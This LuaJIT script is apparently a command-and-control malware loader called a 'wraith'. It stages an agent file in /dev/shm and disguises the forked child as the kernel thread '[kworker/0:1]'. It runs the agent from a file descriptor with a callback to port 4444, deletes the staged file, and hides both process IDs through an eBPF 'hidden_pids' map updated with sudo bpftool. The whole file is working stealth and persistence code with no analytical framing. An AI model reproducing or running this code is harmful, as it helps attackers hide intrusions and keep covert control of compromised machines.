#!/usr/bin/env luajit
-- c2/memfd_agent2.lua - PURE SYSCALL WRAITH

local ffi = require("ffi")

ffi.cdef[[
    typedef int pid_t;
    
    pid_t fork(void);
    int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    int open(const char *pathname, int flags);
    int close(int fd);
    int unlink(const char *pathname);
    void exit(int status);
    int execl(const char *path, const char *arg, ...);
]]

local O_RDONLY = 0
local PR_SET_NAME = 15

local my_pid = tonumber(io.popen("echo $$"):read("*a"))
print("[*] Loader PID: " .. my_pid)

-- Hide loader PID
os.execute(string.format("sudo bpftool map update name hidden_pids key hex 00 00 00 00 value hex %02x %02x %02x %02x 00 00 00 00",
    bit.band(my_pid, 0xFF),
    bit.band(bit.rshift(my_pid, 8), 0xFF),
    bit.band(bit.rshift(my_pid, 16), 0xFF),
    bit.band(bit.rshift(my_pid, 24), 0xFF)
))
print("[+] Loader PID hidden")

-- Stage agent (ONLY c2_agent.lua, no Zig library)
local shm_path = "/dev/shm/.ghost_" .. my_pid
local f = assert(io.open(shm_path, "wb"))
f:write(assert(io.open("c2_agent.lua", "rb")):read("*a"))
f:close()
print("[*] Agent staged → " .. shm_path)

-- Open fd BEFORE fork
local fd = ffi.C.open(shm_path, O_RDONLY)
assert(fd >= 0, "Failed to open staged file")

local pid = ffi.C.fork()
assert(pid >= 0, "fork failed")

if pid == 0 then
    -- CHILD
    ffi.C.prctl(PR_SET_NAME, ffi.cast("unsigned long", ffi.cast("const char*", "[kworker/0:1]")), 0, 0, 0)
    
    local fd_path = string.format("/proc/self/fd/%d", fd)
    ffi.C.execl("/usr/bin/luajit", "luajit", fd_path, "127.0.0.1", "4444", nil)
    ffi.C.exit(1)
else
    -- PARENT
    print("[+] Wraith spawned → PID " .. pid)
    
    ffi.C.close(fd)
    ffi.C.unlink(shm_path)
    
    -- Hide wraith PID
    os.execute(string.format("sudo bpftool map update name hidden_pids key hex 00 00 00 00 value hex %02x %02x %02x %02x 00 00 00 00",
        bit.band(pid, 0xFF),
        bit.band(bit.rshift(pid, 8), 0xFF),
        bit.band(bit.rshift(pid, 16), 0xFF),
        bit.band(bit.rshift(pid, 24), 0xFF)
    ))
    print("[+] Wraith PID hidden")
    print("[*] File deleted, loader exiting")
    ffi.C.exit(0)
end
